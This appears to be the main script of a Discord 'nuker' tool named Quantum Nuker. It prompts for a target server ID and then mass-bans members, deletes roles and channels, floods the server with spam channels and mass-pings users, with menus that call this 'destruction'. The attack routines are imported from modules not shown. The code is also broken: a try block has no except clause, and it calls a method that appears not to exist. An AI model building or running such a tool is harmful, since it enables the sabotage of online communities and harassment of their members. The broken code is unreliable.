import discord
import asyncio
import sys
from dotenv import load_dotenv
from discord_handler import DiscordHandler
from core_functions import NukerCore

# --- Global Constants for Branding ---
TOOL_NAME = "Quantum Nuker"
ARTIST_CREDIT = "Rexden"

async def main_loop(bot, handler: DiscordHandler, nuker: NukerCore, guild_id: int):
    """Manages the core operational loop of the tool."""
    print("\n=========================================")
    print("🚀 QUANTUM NUKER BOOTSTRAP COMPLETE 🚀")
    print("=========================================")

    while True:
        user_input = input(f"\n[{TOOL_NAME}] [Nuke] to start the destruction, or [exit]: ").strip().lower()

        if user_input == 'exit':
            print("\nShutting down Quantum Nuker. Goodbye.")
            break
        elif user_input != 'nuke':
            print("Invalid command detected. Please type 'Nuke' or 'exit'.")
            continue

        try:
            # 1. Get Bot Token and Guild ID Confirmation (Assuming they are already set up/passed)
            bot_token = handler.bot_token # Use the token stored in the handler
            guild_id_input = input(f"Enter Targeted Guild ID (If running remotely): ").strip()
            if not guild_id_input:
                print("Guild ID required for execution path.")
                continue

            target_guild_id = int(guild_id_input)

            confirmation = input(f"WARNING: Are you absolutely sure? This will DESTROY EVERYTHING in the target server.\nType YES to proceed: ").strip().lower()
            if confirmation != 'yes':
                print("Confirmation failed. Aborting sequence.")
                continue

            # --- Execution Sequence Start ---
            print("\n[PHASE 1/4] INITIALIZING BOT AND SETTING METADATA...")
            if not await handler.initialize_bot(target_guild_id, TOOL_NAME):
                 return # Exit if initialization fails

            await bot.feed_messages() # Ensure all pending messages are processed

            # 2. Data Collection (Must happen after metadata update)
            print("\n[PHASE 2/4] GATHERING SERVER DATA...")
            guild = await handler.bot.fetch_guild(target_guild_id)
            if not guild:
                print("FATAL ERROR: Could not fetch the target guild.")
                return

            members = await handler.get_members(guild)
            channels = [c for c in await handler.get_channels(guild)]

            # 3. Execution Flow Selection (Let's default to Full Blast for 'nuke')

            action_selection = input("\n[CHOOSE DESTROY MODE]: \n1: Full Blast (All features)\n2: Ban & Destroy Roles/Channels\n3: Spam Only\nEnter choice (1-3): ").strip()

            if action_selection == '1':
                print("\n--- EXECUTING FULL BLAST PROTOCOL ---")

                # A. Initialization is done, now we run the core sequence
                await nuker.mass_ban(members)

                # B. Mass Destruction (Roles & Channels)
                await nuker.mass_destruction(guild)

                # C. Massive Spam Creation
                print("\n[+] Starting Spammer Generator...")
                created_spam = await nuker.mass_creation(guild)
                print(f"[SUCCESS] {len(created_spam)} items created.")

                # D. Mass Ping (Using the newly created channels as targets for chaos)
                new_channels_for_ping = [c for c, type in created_spam if type == 'channel']
                if new_channels_for_ping:
                    await nuker.mass_ping(guild, new_channels_for_ping)

            elif action_selection == '2':
                print("\n--- EXECUTING BAN AND DESTRUCTION ONLY ---")
                await nuker.mass_ban(members)
                await nuker.mass_destruction(guild)

            elif action_selection == '3':
                print("\n--- EXECUTING SPAM RING PROTOCOL (Ping Focus) ---")
                # For spam focus, we skip full destruction and just create/ping
                created_spam = await nuker.mass_creation(guild)
                new_channels_for_ping = [c for c, type in created_spam if type == 'channel']
                if new_channels_for_ping:
                    await nuker.mass_ping(guild, new_channels_for_ping)

            else:
                print("Invalid action selected. The tool pauses.")


if __name__ == "__main__":
    # --- Setup and Initialization ---

    print("="*60)
    print("WELCOME TO THE ULTIMATE DISCORD SERVER NUKING TOOL")
    print(f"CREDITED BY: {ARTIST_CREDIT}")
    print("="*60)

    # Load environment variables (for local development/token management)
    load_dotenv()

    # Required for production use in the cloud or simple terminal execution
    BOT_TOKEN = "YOUR_SUPER_SECRET_BOT_TOKEN_HERE" # <-- REPLACE THIS OR USE .env

    # The user must manually provide the Guild ID when prompted if not running bot.py style
    TARGET_GUILD_ID = None 

    try:
        handler = DiscordHandler(bot_token=BOT_TOKEN)
        nuker = NukerCore(bot_client=None) # Pass placeholder, handler holds connection logic

        # Run the asynchronous main loop
        asyncio.run(main_loop(
            bot=handler.bot, 
            handler=handler, 
            nuker=nuker, 
            guild_id=TARGET_GUILD_ID
        ))

    except Exception as e:
        print(f"\n[CRITICAL FAILURE] The main execution loop crashed: {e}")
